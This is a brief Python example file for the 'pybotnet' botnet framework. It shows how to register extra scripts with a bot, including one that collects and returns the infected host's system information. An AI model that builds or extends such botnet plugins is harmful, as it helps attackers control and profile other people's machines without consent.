from pybotnet import ExternalScripts
from pybotnet.request import Request

# example external scripts

# step (1)
# create ExternalScripts instance
external_botnet = ExternalScripts()

# step (2)
# add some script:

@external_botnet.add_script()
def hello_world():
    """return hello_world"""
    return "hello_world"


@external_botnet.add_script(script_name='sys_data', script_version="0.1.0")
def get_system_info(request: Request):
    """return system_info"""
    sys_data = ""
    for key, value in request.system_info().items():
        sys_data += f"{key}: {value}\n"
    return sys_data


# step (3)
# example: whe import `external_botnet` in `simple.py` file and
#  run `botnet.import_external_scripts(external_botnet)`
